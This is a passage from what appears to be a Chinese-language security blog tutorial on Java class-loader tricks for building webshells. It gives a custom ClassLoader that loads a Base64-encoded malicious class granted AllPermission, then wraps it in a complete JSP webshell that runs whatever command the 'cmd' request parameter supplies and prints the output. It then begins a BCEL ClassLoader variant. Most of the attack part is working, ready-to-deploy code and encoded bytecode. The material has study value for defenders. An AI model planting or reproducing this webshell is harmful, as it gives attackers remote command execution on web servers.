stringBuilder.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res = stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 回显</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为<code>Class</code>文件之后，还需要对其进行<code>Base64</code>编码，因为直接获取到的字节码是<code>byte[]</code>，为了避免在传输过程中的一些问题，我们选择将其转为<code>base64</code>编码</p><p>可以进行如下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(ByteCodeEvil.class.getName());</span><br><span class="line">    <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class="line">    System.out.println(bytes);</span><br></pre></td></tr></table></figure><blockquote><p>其中ClassPool属于<code>javassist</code>中的东西，我们需要导入依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.24.0-GA&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></blockquote><p>最后可以获得<code>Base64</code>加密后的字节码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311210525.png"></p><p>之后我们需要从自定义的类加载器中将类加载出来，然后进行命令的执行，同时<code>ClassLoader</code>无法在运行时直接加载字节码</p><p>我们开始定义类加载器，一共需要三步：</p><ol><li>编写继承ClassLoader的抽象类</li><li>重写findClass()方法和defineClass()方法</li><li>在findClass()方法中调用调用<code>defineClass()</code>方法</li></ol><p>根据loadClass方法，首先会判断类是否已经被加载了(1)，如果没有，就会调用<code>loadClass</code>去加载(2)，如果还是没有找到，会调用<code>findBootstrapClassOrNull</code>方法。如果没有重写该方法的情况，默认是抛出异常。如果重写了该方法，则会自定义加载(3)</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311234629.png"></p><p>开始重写方法</p><ol><li><p>重写<code>loadClass</code>方法的代码如下，当我们加载的是指定名称的类时，就调用重写后的<code>findClass</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重写<code>findClass</code></p><blockquote><p>在<code>findClass</code>中，如果调用<code>defineClass</code>加载指定的恶意字节码，就会达到运行时加载字节码的效果.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>根据双亲委派机制完善<code>findClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311233314.png"></p></li></ol><blockquote><p>双亲委派机制</p><p>在java的类加载中，首先会检查该类是否已经被加载，若没有被加载，则会委托父加载器进行装载，只有当父加载器无法加载时，才会调用自身的<code>findClass()</code>方法进行加载。这样避免了子加载器加载一些试图冒名顶替可信任类的不可靠类，也不会让子加载器去实现父加载器实现的加载工作</p><p>例如用户使用自定义加载器加载<code>java.lang.Object</code>类，实际上委派给<code>BootstrapClassLoader</code>加载器。如果用户使用自定义类加载器加载<code>java.lang.Exp</code>类，父类无法加载只能交给自定义类加载器。由于同在<code>java.lang</code>包下，所以<code>Exp</code>类可以访问其他类的<code>protected</code>属性，可能涉及到一些敏感信息</p><p>因此必须将这个类与可信任类的访问域隔离，JVM中为了避免这样的危险操作，只允许由同一个类加载器加载的同一包内的类之间互相访问，这样一个由同一个类加载器加载的并属于同一个包的多个类集合称为运行时包</p><p>类加载体系为不同类加载器加载的类提供不同的命名空间，同一命名空间内的类可以互相访问，不同命名空间的类不知道彼此的存在</p></blockquote><p>除了命名空间的访问隔离和双亲委派的受信类保护，类加载器体系还用保护域来定义代码在运行时可以获得的权限</p><blockquote><p>每个class文件均和一个代码来源相关联，这个代码来源(<code>java.security.CodeSource</code>)通过URL类成员<code>location</code>指向代码库和对该class文件进行签名的零个或多个证书对象的数组。class文件在进行代码认证的过程中可能经过多个证书签名，也可能没有进行签名</p><p>访问控制策略<code>Policy</code>对权限的授予是以<code>CodeSource</code>为基础进行的，每个<code>CodeSource</code>拥有若干个<code>Permission</code>，这些<code>Permission</code>对象会被具体地以其子类描述，并且和<code>CodeSource</code>相关联的<code>Permission</code>对象将被封装在<code>java.security.PermissionCollection</code>类的一个子类实例中，以描述该<code>CodeSource</code>所获取的权限</p><p>类加载器的实现可以通过将代码来源(<code>CodeSource</code>)即代码库和该class文件的所有签名者信息，传递给当前的<code>Policy</code>对象的<code>getPermissions()</code>方法，来查询该代码来源所拥有的权限集合<code>PermissionCollection</code>(在策略初始化时生成)，并以此构造一个保护域传递给<code>defineClass()</code>以此指定类的保护域</p></blockquote><p>在jdk自带的源码中<code>defineClass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>PreDefineClass</code>可以看到当pd为空的时候，会返回默认的<code>defaultDomain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ProtectionDomain <span class="title function_">preDefineClass</span><span class="params">(String name,</span></span><br><span class="line"><span class="params">                                            ProtectionDomain pd)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pd == <span class="literal">null</span>) &#123;</span><br><span class="line">            pd = defaultDomain;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pd;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再跟上默认的<code>defaultDomain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ProtectionDomain</span> <span class="variable">defaultDomain</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>),</span><br><span class="line">                         <span class="literal">null</span>, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>同时，因为我们要往入写恶意类执行命令，所以我们需要最高权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br></pre></td></tr></table></figure><p>根据官方文档：The AllPermission is a permission that implies all other permissions</p><p>意味着该代码拥有全部的权限，也就是最高权限，也拥有<code>拥有</code>SocketPermission<code>和</code>FilePermission<code>这种敏感操作的权限</code></p><p>最后得到如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">        pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">        <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (java.security.cert.Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们放到<code>Test.java</code>试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">if</span>(name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> findClass(name);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=&quot;</span>);</span><br><span class="line">                    <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                    pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">                    <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (java.security.cert.Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.Evil.ByteCodeEvil&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> constructor.newInstance(cmd).toString();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>放入我们一开始生成的恶意类的字节码文件，用反射进行执行，最后使用jsp，替换输出为内置对象。就形成了一个jsp马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.cert.Certificate&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page pageEncoding=<span class="string">&quot;GB2312&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">if</span>(name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAF0xjb20vRXZpbC9CeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwA8BwA+BwAtBwAuAQAKRXhjZXB0aW9ucwcAPwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABQAQAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEEMAEIAQwwARABFBwBGDABHAEgMABQASQwAFABKDABLACkMAEwATQEAAQoMACgAKQwAEgATAQAVY29tL0V2aWwvQnl0ZUNvZGVFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAHgAHAAAACQAEAAsADAAMACUADgAvAA8APgARAEYAEgAYAAAANAAFAAAARwAZABoAAAAAAEcAGwATAAEADAA7ABwAHQACACUAIgAeAB8AAwAsABsAIAATAAQAIQAAABsAAv8AJQAEBwAiBwAjBwAkBwAlAAD8ABgHACMAJgAAAAQAAQAnAAEAKAApAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFwAYAAAADAABAAAABQAZABoAAAABACoAAAACACs=&quot;</span>);</span><br><span class="line">                <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">                <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.Evil.ByteCodeEvil&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> constructor.newInstance(cmd).toString();</span><br><span class="line">    response.getWriter().print(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220312002047.png"></p><h2 id="0x02-BECL-ClassLoader"><a href="#0x02-BECL-ClassLoader" class="headerlink" title="0x02 BECL ClassLoader"></a>0x02 BECL ClassLoader</h2><blockquote><p>BCEL 的全名为 Apache Commons BCEL，属于 Apache Commons 项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p></blockquote><p>根据P神的文章 <a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p><p>在 Java 8u251以前，都是可以使用的</p><p>同理，我们也需要获取<code>BECL</code>的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.Evil.ByteCodeEvil;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetBecl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(ByteCodeEvil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code>，先将<code>JAVAClass</code>转换成原生字节码，使用其他类获取字节码也可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 